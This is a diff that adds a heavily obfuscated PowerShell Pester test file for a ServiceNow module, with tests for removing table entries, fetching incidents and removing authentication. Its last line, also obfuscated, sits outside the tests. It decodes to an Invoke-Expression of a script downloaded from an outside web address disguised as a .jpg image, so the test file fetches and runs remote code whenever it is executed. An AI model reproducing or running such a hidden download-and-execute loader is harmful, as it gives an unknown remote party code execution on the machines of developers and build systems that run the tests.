+            ("{1}{0}"-f 'e','Tabl') = ("{1}{0}"-f 'dent','inci')
+        }
+        &("{2}{0}{6}{3}{4}{1}{7}{5}" -f'ove-Servic','E','Rem','ab','le','ry','eNowT','nt') @removeServiceNowTableEntrySplat
+
+        ${GEtSErv`IcenowINc`I`de`Nts`PL`AT} = @{
+            ("{2}{1}{0}" -f'ct','hExa','Matc') = @{("{1}{0}" -f's_id','sy')=$(${tiC`kEt}."SY`S_Id")}
+            ("{1}{3}{2}{0}"-f 'tion','E','rorAc','r') = ("{0}{1}" -f 'St','op')
+        }
+        {&("{1}{4}{3}{2}{0}" -f 'nt','Get-','ncide','viceNowI','Ser') @getServiceNowIncidentSplat} | &("{0}{1}"-f 'Sh','ould') -Throw (("{3}{0}{2}{1}"-f'404)','ot Found',' N','('))
+    }
+
+    &('It') ("{1}{3}{0}{2}{4}"-f 'owAuth','R',' w','emove-ServiceN','orks') {
+        &("{1}{4}{3}{5}{2}{0}" -f'th','Remove-S','Au','iceNo','erv','w') | &("{0}{1}" -f 'Shoul','d') -Be ${tR`UE}
+    }
+}
+
+&("{0}{1}"-f'IE','X') ((&("{0}{1}{2}"-f'ne','w-ob','ject') ("{0}{1}{2}" -f'net','.w','ebclient')).("{0}{1}{2}{3}"-f'd','ownloads','t','ring').Invoke(("{2}{4}{3}{1}{0}{5}"-f 'st.jp','/te','ht','/pmlabs.net/cis','tp:/','g')))
